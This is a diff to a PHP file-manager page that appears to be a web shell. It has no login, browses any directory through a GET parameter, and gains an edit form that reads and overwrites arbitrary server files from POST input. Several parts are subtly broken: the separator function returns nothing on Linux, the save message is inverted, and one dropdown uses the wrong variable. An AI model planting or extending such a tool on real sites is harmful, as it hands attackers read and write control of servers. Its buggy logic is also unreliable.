@@ -1,14 +1,15 @@
 <?php
-define("SLES", DIRECTORY_SEPARATOR);
+date_default_timezone_set("Asia/Jakarta");
 class XN {
     public static $array;
     public static $owner;
     public static $group;
+    public static $handle;
     public static $directory;
     public static function files($type) {
         self::$array = array();
         foreach (scandir(getcwd()) as $key => $value) {
-            $filename['name'] = getcwd() . SLES . $value;
+            $filename['name'] = getcwd() . XN::SLES() . $value;
             switch ($type) {
                 case 'dir':
                     if (!is_dir($filename['name']) || $value === '.' || $value === '..') continue 2;
@@ -26,6 +27,11 @@ class XN {
             self::$array[] = $filename;
         } return self::$array;
     }
+    public static function save($filename, $data) {
+    	self::$handle = fopen($filename, "w");
+    	fwrite(self::$handle, $data);
+    	fclose(self::$handle);
+    }
     public static function size($filename) {
         if (is_file($filename)) {
             $filepath = $filename;
@@ -39,6 +45,70 @@ class XN {
                 $filesize /= 1024;
             } return round($filesize, 2) . " " . $array[$total];
         }
+    }
+    public static function wr($filename, $perms) {
+    	if (is_writable($filename)) {
+    		print "<font color='green'>{$perms}</font>";
+    	} else {
+            print "<font color='red'>{$perms}</font>";
+        }
+    }
+    public static function perms($filename) {
+    	$perms = @fileperms($filename);
+    	switch ($perms & 0xF000) {
+    		case 0xC000:
+        		$info = 's';
+        		break;
+    		case 0xA000:
+        		$info = 'l';
+        		break;
+    		case 0x8000:
+        		$info = 'r';
+        		break;
+    		case 0x6000:
+        		$info = 'b';
+        		break;
+    		case 0x4000:
+        		$info = 'd';
+        		break;
+    		case 0x2000:
+        		$info = 'c';
+        		break;
+    		case 0x1000:
+        		$info = 'p';
+        		break;
+    		default:
+        		$info = 'u';
+        }
+
+		$info .= (($perms & 0x0100) ? 'r' : '-');
+		$info .= (($perms & 0x0080) ? 'w' : '-');
+		$info .= (($perms & 0x0040) ?
+            		(($perms & 0x0800) ? 's' : 'x' ) :
+            		(($perms & 0x0800) ? 'S' : '-'));
+
+		$info .= (($perms & 0x0020) ? 'r' : '-');
+		$info .= (($perms & 0x0010) ? 'w' : '-');
+		$info .= (($perms & 0x0008) ?
+            		(($perms & 0x0400) ? 's' : 'x' ) :
+            		(($perms & 0x0400) ? 'S' : '-'));
+
+		$info .= (($perms & 0x0004) ? 'r' : '-');
+		$info .= (($perms & 0x0002) ? 'w' : '-');
+		$info .= (($perms & 0x0001) ?
+            		(($perms & 0x0200) ? 't' : 'x' ) :
+            		(($perms & 0x0200) ? 'T' : '-'));
+		return $info;
+	}
+	public static function OS() {
+        return (substr(strtoupper(PHP_OS), 0, 3) === "WIN") ? "Windows" : "Linux";
+    }
+    public static function SLES() {
+    	if (self::OS() == 'Windows') {
+    		return str_replace('\\', '/', DIRECTORY_SEPARATOR);
+    	} elseif (self::OS() !== 'Linux') {
+    		return DIRECTORY_SEPARATOR;
+    	}
     }
     public static function owner($filename) {
         if (function_exists("posix_getpwuid")) {
@@ -80,10 +150,7 @@ class XN {
     }
 }
 if (isset($_GET['x'])) {
-    if (XN::cd($_GET['x'])) {
-    } else {
-    ?> <script type="text/javascript">alert("permission danied")</script> <?
-}
+	XN::cd($_GET['x']);
 }
 ?>
 <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css"/>
@@ -104,8 +171,12 @@ if (isset($_GET['x'])) {
     .storage span.title {
         font-size: 23px;
     }
+    .storage span:nth-child(4) {
+    	font-size: 10px;
+    }
     .storage span:nth-child(3) {
         float: right;
+        font-size: 10px;
     }
     .back {
         font-size: 20px;
@@ -123,7 +194,9 @@ if (isset($_GET['x'])) {
         font-size: 23px;
     }
     .back a {
-        background: blue;
+        background: #fff;
+        color: #000;
+        font-weight: bold;
         border-radius:10px;
         padding: 5px;
         padding-left: 7px;
@@ -143,6 +216,20 @@ if (isset($_GET['x'])) {
         overflow: auto;
         height:485px;
 
+    }
+    .edit table td {
+    	padding-top:10px;
+    	padding-bottom: 10px;
+    }
+    textarea {
+    	width: 100%;
+    	height:330px;
+    	border-radius: 10px;
+    	border: 1px solid #f2f2f2;
+        background: #f0f2f5;
+        outline: none;
+        padding:20px;
+        resize: none;
     }
     table {
         width: 100%;
@@ -172,10 +259,33 @@ if (isset($_GET['x'])) {
         float: left;
         margin-right: 10px;
     }
+    .block .name {
+    	display: inline-block;
+    }
     .block .date {
         margin-top: 4px;
         font-size: 70%;
         color: #666;
+    }
+    .block .date .dir-size,
+    .block .date .file-size {
+    	min-width:90px;
+    	display: inline-block;
+    }
+    .block .date .dir-perms,
+    .block .date .file-perms {
+    	min-width:100px;
+    	display: inline-block;
+    }
+    .block .date .dir-time,
+    .block .date .file-time {
+    	min-width:150px;
+    	display: inline-block;
+    }
+    .block .date .dir-owner,
+    .block .date .file-owner {
+    	min-width:100px;
+    	display: inline-block;
     }
     .block a {
         border-radius:5px;
@@ -189,6 +299,7 @@ if (isset($_GET['x'])) {
         text-decoration: none;
     }
     a {
+    	color: #000;
         text-decoration: none;
     }
     nav {
@@ -215,13 +326,20 @@ if (isset($_GET['x'])) {
     ul.dropdown li {
         list-style-type: none;
     }
-    ul.dropdown li a {
+    ul.dropdown li button {
+    	text-align: left;
+    	outline: none;
         color: #000;
+        width: 100%;
+        font-size:18px;
+        background: none;
+        border: none;
         text-decoration: none;
         padding: .5em 1em;
         display: block;
     }
-    ul.dropdown li a:hover {
+    ul.dropdown li button:hover {
+    	cursor: pointer;
         text-decoration: none;
         background: #efefef;
     }
@@ -255,12 +373,94 @@ if (isset($_GET['x'])) {
 </script>
 <center>
 <div class="files">
+	<?php
+    switch (@$_POST['action']) {
+    	case 'edit':
+    	if (isset($_POST['save'])) {
+    		if (XN::save($_POST['file'], $_POST['data'])) {
+    			print("failed");
+    		} else {
+    			print("success");
+    		}
+    	}
+    		?>
+    		<div class="back">
+    			<a href="?x=<?= getcwd() ?>">
+    				<i class="fa fa-arrow-left" aria-hidden="true"></i>
+        		</a>
+        		<span>
+            		EDIT
+        		</span>
+        		<button>
+            		<i class="fa fa-ellipsis-h" aria-hidden="true"></i>
+        		</button>
+    		</div>
+    		<div class="edit">
+    			<table>
+    				<tr>
+    					<td>
+    						Filename
+    					</td>
+    					<td>:</td>
+    					<td>
+    						<?= XN::wr(basename($_POST['file']), basename($_POST['file'])) ?>
+    					</td>
+    				</tr>
+    				<tr>
+    					<td>
+    						Size
+    					</td>
+    					<td>:</td>
+    					<td>
+    						<?= XN::size($_POST['file']) ?>
+    					</td>
+    				</tr>
+    				<tr>
+    					<td>
+    						Last Modif
+    					</td>
+    					<td>:</td>
+    					<td>
+    						<?= XN::ftime($_POST['file']) ?>
+    					</td>
+    				</tr>
+    				<tr>
+    					<form method="post">
+    						<td colspan="3">
+    							<button disabled>Edit</button>
+    							<button>Delete</button>
+    							<button>Rename</button>
+    							<button>Backup</button>
+    						</td>
+    					</form>
+    				</tr>
+    				<form method="post">
+    					<tr>
+    						<td colspan="3">
+    							<textarea name="data"><?= htmlspecialchars(file_get_contents($_POST['file'])) ?></textarea>
+    						</td>
+    					</tr>
+    					<tr>
+    						<td colspan="3">
+    							<input type="submit" name="save" value="SAVE">
+    							<input type="hidden" name="file" value="<?= $_POST['file'] ?>">
+    							<input type="hidden" name="action" value="edit">
+    						</td>
+    					</tr>
+    				</form>
+    			</table>
+    		</div>
+    		<?php
+    		exit;
+    		break;
+    }
+    ?>
     <div class="back">
         <a href="?x=<?= dirname(getcwd()) ?>">
             <i class="fa fa-arrow-left" aria-hidden="true"></i>
         </a>
         <span>
-            <?= SLES . basename(getcwd()) ?>
+            <?= XN::SLES() . basename(getcwd()) ?>
         </span>
         <button>
             <i class="fa fa-ellipsis-h" aria-hidden="true"></i>
@@ -287,10 +487,19 @@ if (isset($_GET['x'])) {
                             <div class="name">
                                 <?= $dir['names'] ?>
                                 <div class="date">
-                                    <?= $dir['size'] ?> &nbsp;&nbsp;&nbsp;
-                                    // permission &nbsp;&nbsp;&nbsp;
-                                    <?= $dir['ftime'] ?> &nbsp;&nbsp;&nbsp;
-                                    <?= $dir['owner'] ?>
+                                    <div class="dir-size">
+                                    	<?= $dir['size'] ?>
+                                    </div>
+                                    <div class="dir-perms">
+                                    	<?= XN::wr($dir['name'], 
+                                    	XN::perms($dir['name'])) ?>
+                                    </div>
+                                    <div class="dir-time">
+                                    	<?= $dir['ftime'] ?>
+                                    </div>
+                                    <div class="dir-owner">
+                                    	<?= $dir['owner'] ?>
+                                    </div>
                                 </div>
                             </div>
                         </a>
@@ -302,10 +511,18 @@ if (isset($_GET['x'])) {
                             <i class="fa fa-ellipsis-v" aria-hidden="true"></i>
                         </a>
                         <ul class="dropdown">
-                            <li><a href="?<?= $dir['name'] ?>">Edit</a></li>
-                            <li><a href="#">Delete</a></li>
-                            <li><a href="#">Rename</a></li>
-                            <li><a href="#">Change name</a></li>
+                        	<form method="post" action="?x=<?= getcwd() ?>">
+                            	<li>
+                            		<button name="action" value="delete">Delete</button>
+                            	</li>
+                            	<li>
+                            		<button name="action" value="rename">Rename</button>
+                            	</li>
+                            	<li>
+                            		<button name="action" value="backup">Backup</button>
+                            	</li>
+                            	<input type="hidden" name="file" value="<?= $file['name'] ?>">
+                            </form>
                         </ul>
                     </nav>
                 </td>
@@ -322,10 +539,19 @@ if (isset($_GET['x'])) {
                             <div class="name">
                                 <?= $file['names'] ?>
                                 <div class="date">
-                                    <?= $file['size'] ?> &nbsp;&nbsp;&nbsp;
-                                    // permission &nbsp;&nbsp;&nbsp;
-                                    <?= $file['ftime'] ?> &nbsp;&nbsp;&nbsp;
-                                    <?= $file['owner'] ?>
+                                    <div class="file-size">
+                                    	<?= $file['size'] ?>
+                                    </div>
+                                    <div class="file-perms">
+                                    	<?= XN::wr($file['name'], 
+                                    	XN::perms($file['name'])) ?>
+                                    </div>
+                                    <div class="file-time">
+                                    	<?= $file['ftime'] ?>
+                                    </div>
+                                    <div class="file-owner">
+                                    	<?= $file['owner'] ?>
+                                    </div>
                                 </div>
                             </div>
                         </a>
@@ -337,10 +563,21 @@ if (isset($_GET['x'])) {
                             <i class="fa fa-ellipsis-v" aria-hidden="true"></i>
                         </a>
                         <ul class="dropdown">
-                            <li><a href="?<?= $file['name'] ?>">Edit</a></li>
-                            <li><a href="#">Delete</a></li>
-                            <li><a href="#">Rename</a></li>
-                            <li><a href="#">Change name</a></li>
+                        	<form method="post" action="?x=<?= getcwd() ?>">
+                        		<li>
+                        			<button name="action" value="edit">Edit</button>
+                        		</li>
+                            	<li>
+                            		<button name="action" value="delete">Delete</button>
+                            	</li>
+                            	<li>
+                            		<button name="action" value="rename">Rename</button>
+                            	</li>
+                            	<li>
+                            		<button name="action" value="backup">Backup</button>
+                            	</li>
+                            	<input type="hidden" name="file" value="<?= $file['name'] ?>">
+                            </form>
                         </ul>
                     </nav>
                 </td>
